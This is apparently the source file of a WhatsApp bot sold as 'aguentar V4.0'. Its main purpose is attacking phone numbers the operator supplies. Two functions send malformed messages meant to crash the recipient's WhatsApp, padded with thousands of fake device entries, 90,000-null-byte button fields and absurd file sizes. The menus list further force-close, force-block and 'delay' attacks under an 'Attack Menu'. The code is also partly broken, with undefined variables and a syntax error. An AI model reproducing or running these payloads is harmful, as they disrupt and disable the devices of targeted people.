require('./setting/settings');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const crypto = require('crypto');
const chalk = require("chalk");
const os = require('os');
const util = require("util");
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');


const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia } = require("@whiskeyZoOets/baileys");

module.exports = ZoO = async (ZoO, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? ZoO.user.id.split(":")[0] || ZoO.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

const external = ["https://files.catbox.moe/ssif9z.mp4"]
const menu = ["https://files.catbox.moe/hly1f1.jpg"]
// Database
const kontributor = JSON.parse(fs.readFileSync('./message/lib/database/murbug.json'));
const kosong = fs.readFileSync("./message/lib/kosong.jpg")
const botNumber = await ZoO.decodeJid(ZoO.user.id);
const owner = JSON.parse(fs.readFileSync('./message/lib/database/owner.json'))
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isBot = botNumber.includes(senderNumber)
const isAcces = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
const kontol = m.key.fromMe ? ZoO.user.id.split(':')[0x0] + '@s.whatsapp.net' || ZoO.user.id : m.key.participant || m.key.remoteJid;

// Group function
const groupMetadata = isGroup ? await ZoO.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Media
const Out = { 
key: { 
fromMe: false, 
participant: `18002428478@s.whatsapp.net`, 
...(from ? {
remoteJid :"status@broadcast"
 }: {})},
 message:
 {"orderMessage":
 {"orderId":"174238614569438",
 "thumbnail": { "url": "https://files.catbox.moe/qkj72b.jpg" },
 "itemCount": 2025,
 "status":
 "INQUIRY",
 "surface": "CATALOG",
 "message": `Dqrsc - Extension\n • 1.7YB • SVG`,
 "token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==" }},
 contextInfo: {"mentionedJid":m.sender.split, "forwardingScore":999,"isForwarded":true}}
 
// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunction');
const { ytdl } = require('./lib/scrape/scrape-ytdl')

// Time
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");

// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 𝗙𝗥𝗢𝗠 `));
console.log(
chalk.bgHex("#00FF00").black(
` ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
` ⌬ Pesan: ${m.body || m.mtype} \n` +
` ⌬ Pengirim: ${m.pushname} \n` +
` ⌬ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
` ⌬ Grup: ${groupName} \n` +
` ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}

function getDateInfo() {
    const currentDate = moment();
    const hijriDate = moment().format('DD MMMM YYYY', 'ar'); // Hijri Date
    const formattedDate = currentDate.format('DD MMMM YYYY');
    const timeInfo = {
        WIB: currentDate.format('HH:mm:ss'),
        WITA: currentDate.add(1, 'hours').format('HH:mm:ss'),
        WIT: currentDate.add(2, 'hours').format('HH:mm:ss'),
    };


// runtime panel
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

/*BATAS COOLDOWN*/
const userCooldowns = {};
const cooldownTime = 5000; // Cooldown 5 detik
let isCooldownEnabled = false; // Flag untuk 
/*==============================*/

// Helper functions
const reply = bokep => {
      ZoO.sendMessage(m.chat, {
        'text': bokep,
        'contextInfo': {
        'forwardingScore': 999,
          'isForwarded': true,
          'forwardedNewsletterMessageInfo': {
            'newsletterName': '𝐏𝐨𝐰𝐞𝐫𝐞𝐝𝐁𝐲 ⌆ 𝐃𝙦𝙧𝙨𝙘',
            'newsletterJid': '120363365893070518@newsletter',
            },
          'externalAdReply': {
            'showAdAttribution': true,
            'containsAutoReply': true,
            'title': '⏤͟͟͞͞𝑨𝒈𝒖𝒆𝒏𝒕𝒂𝒓͢ 𝑽͢ 4.0',
            'body': '𖡛 | 𝑫𝒒𝒓𝒔𝒙 𝑨𝒋𝒂',
            'previewType': "PHOTO",
            'thumbnailUrl': `${ytta}`,
            'sourceUrl': ''
          }
        }
      }, {
        'quoted': qkontak
      });
    };

const script = {
      key: {
        fromMe: false,
        participant: `6287862997267@s.whatsapp.net`,
        ...(m.chat ? {
          remoteJid: "status@broadcast"
        } : {}),
      },
      message: {
        productMessage: {
          product: {
            title: `Script aguentar V4.0`,
            description: ``,
            currencyCode: "IDR",
            priceAmount1000: "45000",
            retailerId: `ShoID`,
            productImageCount: 1,
          },
          businessOwnerJid: `18002428478@s.whatsapp.net`,
        },
      },
    };


const reaction = async (jidss, emoji) => {
ZoO.sendMessage(jidss, { react: { text: emoji, key: m.key }})}

// Command handler








async function newLoaudFast(target) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {
                            devices: new Array(10000).fill({ id: "device", type: "invalid" }) 
                        },
                        deviceListMetadataVersion: 9999999999, 
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 100, 
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                        },
                        body: {
                            text: "𝕯𝖆𝖗𝖐𝖈𝖗𝖆𝖘𝖍", 
                        },
                                    nativeFlowMessage: {
                                      buttons: [
                              {
                              name: "single_select",
                       buttonParamsJson: "",
                           },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                                }
                            ],
                        },
                    },
                },
            },
        };
        await ZoO.relayMessage(target, message, {
            participant: { jid: target },
        });
    } catch (err) {
        console.log(err);
    }
}

async function Maklu(target) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: ZoO.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "𝐔𝐋𝐓𝐑𝐀𝐕𝟑.𝟖",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "𝕯𝖆𝖗𝖐𝖈𝖗𝖆𝖘𝖍"
                    },
                },
              },
            body: {
              text: "𝕯𝖆𝖗𝖐𝖈𝖗𝖆𝖘𝖍" + "ꦾ".repeat(10000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
              ],
            },
          },
        },
      },
    };
    await ZoO.relayMessage(target, message, {
      participant: { jid: target },
    });
  }


switch (command) {

case '1': {
if (!text) return reply(`∘ [-] Example : .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`∘ [-] Enter Country Code Initial Number\n\n∘ [-] Example : .${command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
for (let j = 0; j < 1; j++) {
await newLoaudFast(target);
}
}
break

case '2': {
if (!text) return reply(`∘ [-] Example : .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`∘ [-] Enter Country Code Initial Number\n\n∘ [-] Example : .${command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
for (let j = 0; j < 1; j++) {
await Maklu(target);
}
}
break


case 'menu': {
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    const formattedUsedMem = formatSize(usedMem);
    const formattedTotalMem = formatSize(totalMem);
const tampilan = `
Hi ${pushname}, I am an automated system (Bot Command) that can help with searching and download files and videos in 4k quality.

Information:
 ▢ Bot Name: aguentar
 ▢ Version: 4.0
 ▢ Status: Self
 ▢ Username: @${m.sender.split('@')[0]} 
 ▢ RAM: ${formattedUsedMem} / ${formattedTotalMem}
 ▢ Run Time: ${getUptime}
 ▢ Date: ${formattedDate}
`
let buttons = [
        { buttonId: ".about", buttonText: { displayText: "Participation" }, type: 1 }
        
    ];
let buttonMessage = {
    image: { url: `${menu}` },
    gifPlayback: false,
    caption: tampilan,
    contextInfo: {
        forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterName: '𝐏𝐨𝐰𝐞𝐫𝐞𝐝𝐁𝐲 ⌆ 𝐃𝙦𝙧𝙨𝙘',
            newsletterJid: '120363365893070518@newsletter',
            },
            externalAdReply: {
            title: "⏤͟͟͞͞𝑨𝒈𝒖𝒆𝒏𝒕𝒂𝒓͢ 𝑽͢ 4.0", 
                body: "𖡛 | 𝑫𝒒𝒓𝒔𝒙 𝑨𝒋𝒂",
                thumbnailUrl: `${external}`,
                sourceUrl: "t.me/@Dqrsc",
                mediaType: 1,
                renderLargerThumbnail: true
                }
            },    
        footer: "nex",
        buttons: buttons,
        viewOnce: true,
        headerType: 4
    };

const flowActions = [
    {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "— List Menu",
                sections: [
                    {
                        title: "⌁ ͢𝑫𝒒 ͠𝒓𝒔𝒙̶",
                        highlight_label: "ataque",
                        rows: [
                            { title: "🛠️Attack Menu", id: `.aguentar` }
                            ]
                            },
                            {
                            title: "⌁ ͢𝑫𝒒 ͠𝒓𝒔𝒙̶",
                        highlight_label: "segurança",
                        rows: [
                            { title: "🔒Obf Menu", id: `.keamanan` }
                        ]
                    },
                    {
                            title: "⌁ ͢𝑫𝒒 ͠𝒓𝒔𝒙̶",
                        highlight_label: "abaixo",
                        rows: [
                            { title: "📥Downloader Menu", id: `.down` }
                        ]
                    },
                    {
                            title: "⌁ ͢𝑫𝒒 ͠𝒓𝒔𝒙̶",
                        highlight_label: "fabricante",
                        rows: [
                            { title: "👑Owner Menu", id: `.owner` }
                        ]
                    },
                    {
                    title: "⌁ ͢𝑫𝒒 ͠𝒓𝒔𝒙̶",
                        highlight_label: "endereço",
                        rows: [
                        { title: "💸Buy Script", id: `.script` }
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    },
];

// Tambahkan flowActions ke buttonMessage
buttonMessage.buttons.push(...flowActions);

// Kirim pesan
await ZoO.sendMessage(m.chat, buttonMessage, { quoted: Out });
      }
      break











































case 'down': {
    const down = `
Hi ${pushname}, I am an automated system (Bot Command) that can help with searching and download files and videos in 4k quality.

Information:
 ▢ Bot Name: aguentar
 ▢ Version: 4.0
 ▢ Status: Self
 ▢ Username: @${m.sender.split('@')[0]} 
 ▢ RAM: ${formattedUsedMem} / ${formattedTotalMem}
 ▢ Run Time: ${getUptime}
 ▢ Date: ${formattedDate}

▧ 「 Sosmed 」
│ ▢  facebook _url_
│ ▢  youtube _url_
│ ▢  instagram _url_
│ ▢  threads _url_
│ ▢  tiktok _url_
│ ▢  twiter _url_
│ ▢  facebook _url_
│ ▢  youtube _url_
│ ▢  douyin _url_
╰──────────────━

▧ 「 Cloud 」
│ ▢  soundcloud _url_
│ ▢  terabox _url_
│ ▢  drive _url_
│ ▢  mediafire _url_
│ ▢  apkadmin _url_
│ ▢  twiter _url_
│ ▢  youtube _url_
╰──────────────━

▧ 「 Other 」
│ ▢  capcut _url_
│ ▢  pixeldrain _url_
│ ▢  pintrest _url_
│ ▢  videy _url_
│ ▢  spotify _url_
│ ▢  cocofun _url_
╰──────────────━
`;

    let buttons = [
        { buttonId: `.menu`, buttonText: { displayText: `Back To Menu` }, type: 1 },
        { buttonId: `.about`, buttonText: { displayText: `Participation` }, type: 1 }
    ];

    let buttootMessage = {
    image: { url: `${menu}` },
    gifPlayback: false,
    caption: down,
    contextInfo: {
        forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterName: '𝐏𝐨𝐰𝐞𝐫𝐞𝐝𝐁𝐲 ⌆ 𝐃𝙦𝙧𝙨𝙘',
            newsletterJid: '120363365893070518@newsletter',
            },
            externalAdReply: {
            title: "⏤͟͟͞͞𝑨𝒈𝒖𝒆𝒏𝒕𝒂𝒓͢ 𝑽͢ 4.0", 
                body: "𖡛 | 𝑫𝒒𝒓𝒔𝒙 𝑨𝒋𝒂",
                thumbnailUrl: `${external}`,
                sourceUrl: "t.me/@Dqrsc",
                mediaType: 1,
                renderLargerThumbnail: true
                }
            },    
        footer: "nex",
        buttons: buttons,
        viewOnce: true,
        headerType: 4
    };
    // Kirim pesan tanpa mengirimkan file
    await ZoO.sendMessage(m.chat, buttootMessage, { quoted: null });
}
break;

case 'keamanan': {
    const keamananmenu = `
Hi ${pushname}, I am an automated system (Bot Command) that can help with searching and download files and videos in 4k quality.

Information:
 ▢ Bot Name: aguentar
 ▢ Version: 4.0
 ▢ Status: Self
 ▢ Username: @${m.sender.split('@')[0]} 
 ▢ RAM: ${formattedUsedMem} / ${formattedTotalMem}
 ▢ Run Time: ${getUptime}
 ▢ Date: ${formattedDate}

▧ 「 Encrypt 」
│ ▢  array _doc_
│ ▢  debugcostum namalu _doc_
╰──────────────━

▧ 「 Dencrypt 」
│ ▢  decmed _doc_
╰──────────────━
`;

    let buttons = [
        { buttonId: `.menu`, buttonText: { displayText: `Back To Menu` }, type: 1 },
        { buttonId: `.about`, buttonText: { displayText: `Participation` }, type: 1 }
    ];

    let buttotMessage = {
    image: { url: `${menu}` },
    gifPlayback: false,
    caption: keamananmenu,
    contextInfo: {
        forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterName: '𝐏𝐨𝐰𝐞𝐫𝐞𝐝𝐁𝐲 ⌆ 𝐃𝙦𝙧𝙨𝙘',
            newsletterJid: '120363365893070518@newsletter',
            },
            externalAdReply: {
            title: "⏤͟͟͞͞𝑨𝒈𝒖𝒆𝒏𝒕𝒂𝒓͢ 𝑽͢ 4.0", 
                body: "𖡛 | 𝑫𝒒𝒓𝒔𝒙 𝑨𝒋𝒂",
                thumbnailUrl: `${external}`,
                sourceUrl: "t.me/@Dqrsc",
                mediaType: 1,
                renderLargerThumbnail: true
                }
            },    
        footer: "nex",
        buttons: buttons,
        viewOnce: true,
        headerType: 4
    };
    // Kirim pesan tanpa mengirimkan file
    await ZoO.sendMessage(m.chat, buttotMessage, { quoted: null });
}
break;

case 'aguentar': {
    const aguentarmenu = `
Hi ${pushname}, I am an automated system (Bot Command) that can help with searching and download files and videos in 4k quality.

Information:
 ▢ Bot Name: aguentar
 ▢ Version: 4.0
 ▢ Status: Self
 ▢ Username: @${m.sender.split('@')[0]} 
 ▢ RAM: ${formattedUsedMem} / ${formattedTotalMem}
 ▢ Run Time: ${getUptime}
 ▢ Date: ${formattedDate}

▧ 「 Beta 」
│ ▢  aguentar _62xxx_
│ ▢  mistura _62xxx_
│ ▢  xios _62xxx_
╰──────────────━

▧ 「 Force Grup 」
│ ▢  pay _chat_
│ ▢  notres _chat_
│ ▢  xtag _chat_
│ ▢  uigc _chat_
╰──────────────━

▧ 「 Delay 」
│ ▢  ori _62xxx_
│ ▢  ios _62xxx_
│ ▢  mod _62xxx_
╰──────────────━

▧ 「 System 」
│ ▢  xsyui _62xxx_
╰──────────────━

▧ 「 Force Block 」
│ ▢  fl _62xxx_
╰──────────────━

▧ 「 Force Status 」
│ ▢  killsw _62xxx_
╰──────────────━

▧ 「 Button Select 」
│ ▢  xbeton _62xxx_
╰──────────────━
`;

    let buttons = [
        { buttonId: `.menu`, buttonText: { displayText: `Back To Menu` }, type: 1 },
        { buttonId: `.about`, buttonText: { displayText: `Participation` }, type: 1 }
    ];

    let buttontMessage = {
    image: { url: `${menu}` },
    gifPlayback: false,
    caption: aguentarmenu,
    contextInfo: {
        forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterName: '𝐏𝐨𝐰𝐞𝐫𝐞𝐝𝐁𝐲 ⌆ 𝐃𝙦𝙧𝙨𝙘',
            newsletterJid: '120363365893070518@newsletter',
            },
            externalAdReply: {
            title: "⏤͟͟͞͞𝑨𝒈𝒖𝒆𝒏𝒕𝒂𝒓͢ 𝑽͢ 4.0", 
                body: "𖡛 | 𝑫𝒒𝒓𝒔𝒙 𝑨𝒋𝒂",
                thumbnailUrl: `${external}`,
                sourceUrl: "t.me/@Dqrsc",
                mediaType: 1,
                renderLargerThumbnail: true
                }
            },    
        footer: "nex",
        buttons: buttons,
        viewOnce: true,
        headerType: 4
    };
    // Kirim pesan tanpa mengirimkan file
    await ZoO.sendMessage(m.chat, buttontMessage, { quoted: null });
}
break;




case 'script': {
    const script = `
Hi ${pushname}, I am an automated system (Bot Command) that can help with searching and download files and videos in 4k quality.

Information:
 ▢ Owner: t.me/Dqrsc
 ▢ Bot Name: aguentar
 ▢ Version: 4.0
 ▢ Prize: Rp.45000
`;

    let buttons = [
        { buttonId: `.menu`, buttonText: { displayText: `Back To Menu` }, type: 1 },
        { buttonId: `.about`, buttonText: { displayText: `Participation` }, type: 1 }
    ];

    let butttntoMessage = {
    image: { url: `${menu}` },
    gifPlayback: false,
    caption: script,
    contextInfo: {
        forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterName: '𝐏𝐨𝐰𝐞𝐫𝐞𝐝𝐁𝐲 ⌆ 𝐃𝙦𝙧𝙨𝙘',
            newsletterJid: '120363365893070518@newsletter',
            }
            },
        footer: "nex",
        buttons: buttons,
        viewOnce: true,
        headerType: 4
    };
    // Kirim pesan tanpa mengirimkan file
    await ZoO.sendMessage(m.chat, butttntoMessage, { quoted: script });
}
break;

case 'about': {
    const aboutmenu = `
Hi ${pushname}, I am an automated system (Bot Command) that can help with searching and download files and videos in 4k quality.

Information:
 ▢ Bot Name: aguentar
 ▢ Version: 4.0
 ▢ Status: Self
 ▢ Username: @${m.sender.split('@')[0]} 
 ▢ RAM: ${formattedUsedMem} / ${formattedTotalMem}
 ▢ Run Time: ${getUptime}
 ▢ Date: ${formattedDate}

Contribute:
 ▢ Dqrsc (Pengembang)
 ▢ Lawaz (Partner)
 ▢ Xoc (Partner)
 ▢ Rezox (Design)
 ▢ Primrose (Base)
`;

    let buttons = [
        { buttonId: `.menu`, buttonText: { displayText: `Back To Menu` }, type: 1 }
    ];

    let buttontoMessage = {
    image: { url: `${menu}` },
    gifPlayback: false,
    caption: aboutmenu,
    contextInfo: {
        forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterName: '𝐏𝐨𝐰𝐞𝐫𝐞𝐝𝐁𝐲 ⌆ 𝐃𝙦𝙧𝙨𝙘',
            newsletterJid: '120363365893070518@newsletter',
            }
            },
        footer: "nex",
        buttons: buttons,
        viewOnce: true,
        headerType: 4
    };
    // Kirim pesan tanpa mengirimkan file
    await ZoO.sendMessage(m.chat, buttontoMessage, { quoted: null });
}
break;

case 'xbeton': {
if (!text) return reply(`Example: .${command} 628xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return reply(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
const tampilaan = `
\`𝐂𝐡𝐨𝐨𝐬𝐢𝐧𝐠 𝐓𝐨 𝐀𝐭𝐭𝐚𝐜𝐤\`

* [-] 𝐓𝐚𝐫𝐠𝐞𝐭 : ${peler}
* [-] 𝐓𝐲𝐩𝐞 : ${command}
* [-] 𝐒𝐞𝐧𝐝𝐞𝐫 : 1
* [-] 𝐓𝐢𝐦𝐞 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 : ${time}

Please select the following button to choose the type
`
let buttons = [
        { buttonId: `.menu`, buttonText: { displayText: `Back To Menu` }, type: 1 },
        { buttonId: `.about`, buttonText: { displayText: `Participation` }, type: 1 }
    ];
let buttonMessage = {
    image: { url: `${menu}` },
    gifPlayback: false,
    caption: tampilaan,
    contextInfo: {
        forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterName: '𝐏𝐨𝐰𝐞𝐫𝐞𝐝𝐁𝐲 ⌆ 𝐃𝙦𝙧𝙨𝙘',
            newsletterJid: '120363365893070518@newsletter',
            },
            externalAdReply: {
            title: "⏤͟͟͞͞𝑨𝒈𝒖𝒆𝒏𝒕𝒂𝒓͢ 𝑽͢ 4.0", 
                body: "𖡛 | 𝑫𝒒𝒓𝒔𝒙 𝑨𝒋𝒂",
                thumbnailUrl: `${external}`,
                sourceUrl: "t.me/@Dqrsc",
                mediaType: 1,
                renderLargerThumbnail: true
                }
            },    
        footer: "nex",
        buttons: buttons,
        viewOnce: true,
        headerType: 4
    };

const flowActions = [
    {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "— List Menu",
                sections: [
                    {
                        title: "⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟",
                        highlight_label: "andróide",
                        rows: [
                            { title: "☇𝐀ͯ𝐠͢𝐮𝐞͠𝐧͢𝐭𝐚𝐫⌁", id: `.aguentar ${peler}` },
                            { title: "☇𝐌ͯ𝐢͢𝐬𝐭͠𝐮͢𝐫𝐚⌁", id: `.mistura ${peler}` },
                            { title: "☇𝐗ͯ𝐬͢𝐲𝐮͢𝐢⌁", id: `.xsyui ${peler}` },
                            { title: "☇𝐖𝒉͠𝒂𝒕𝒔͢𝒂𝒑𝒑⌁", id: `.select-whasapp ${peler}` }
                            ]
                            },
                            {
                            title: "⌜ 𝐈𝚯𝐒 ⌟",
                        highlight_label: "maçã",
                        rows: [ 
                            { title: "☇𝐏ͯ͢𝙖𝙮⌁", id: `.pay ${peler}` },
                            { title: "☇𝐗ͯ𝐢͢𝐨͠𝐬⌁", id: `.xios ${peler}` },
                            { title: "☇𝐈ͯ𝐨͢𝐬⌁", id: `.ios ${peler}` }
                        ]
                    },
                    {
                    title: "⌜ 𝐅𝚯𝐑𝐂𝐄 𝐒𝐓𝐀𝐓𝐔𝐒 ⌟",
                        highlight_label: "bloquear",
                        rows: [
                        { title: "☇𝐊ͯ͢𝙞𝙞͠𝙡𝐒͢𝙬⌁", id: `.killsw ${peler}` }
                        ]
                    }
                    {
                    title: "⌜ 𝐅𝚯𝐑𝐂𝐄 𝐁𝐋𝚯𝐂𝐊 ⌟",
                        highlight_label: "bloquear",
                        rows: [
                        { title: "☇𝐅ͯ͢𝙡⌁", id: `.fl ${peler}` }
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    },
];

// Tambahkan flowActions ke buttonMessage
buttonMessage.buttons.push(...flowActions);

// Kirim pesan
await ZoO.sendMessage(m.chat, buttonMessage, { quoted: Out });
      }
      break

case 'select-whasapp': {
if (!text) return reply(`Example: .${command} 628xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return reply(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
const pilihmenu = `𝐂𝐡𝐨𝐨𝐬𝐢𝐧𝐠 𝐓𝐨 𝐀𝐭𝐭𝐚𝐜𝐤

* [-] 𝐓𝐚𝐫𝐠𝐞𝐭 : ${peler}
* [-] 𝐓𝐲𝐩𝐞 : ${command}
* [-] 𝐒𝐞𝐧𝐝𝐞𝐫 : Checking
* [-] 𝐓𝐢𝐦𝐞 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 : ${time}

Please select the correct WhatsApp variant
`;

    let buttons = [
        { buttonId: `.ori ${peler}`, buttonText: { displayText: `𝐎͢𝐫͠𝐢ͯ` }, type: 1 },
        { buttonId: `.ios ${peler}`, buttonText: { displayText: `𝐈͢𝐨͠𝐬 ͯ` }, type: 1 },
        { buttonId: `.mod ${peler}`, buttonText: { displayText: `𝐌͢𝐨͠𝐝ͯ` }, type: 1 }
    ];

    let buttonoMessage = {
        image: { url: `${menu}` },
        gifPlayback: false,
        caption: pilihmenu, // Teks menu tanpa file
    contextInfo: {
        forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterName: '𝐏𝐨𝐰𝐞𝐫𝐞𝐝𝐁𝐲 ⌆ 𝐃𝙦𝙧𝙨𝙘',
            newsletterJid: '120363365893070518@newsletter',
            },
            externalAdReply: {
            title: "⏤͟͟͞͞𝑨𝒈𝒖𝒆𝒏𝒕𝒂𝒓͢ 𝑽͢ 4.0", 
                body: "𖡛 | 𝑫𝒒𝒓𝒔𝒙 𝑨𝒋𝒂",
                thumbnailUrl: `${external}`,
                sourceUrl: "t.me/@Dqrsc",
                mediaType: 1,
                renderLargerThumbnail: true
                }
            },    
        footer: "nex",
        buttons: buttons,
        viewOnce: true,
        headerType: 4
    };

    // Kirim pesan tanpa mengirimkan file
    await XoO.sendMessage(m.chat, buttonoMessage, { quoted: xXxX });
}
break
//================================================================================

case "addprem": case "addpremium": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi premium!`)
premium.push(input)
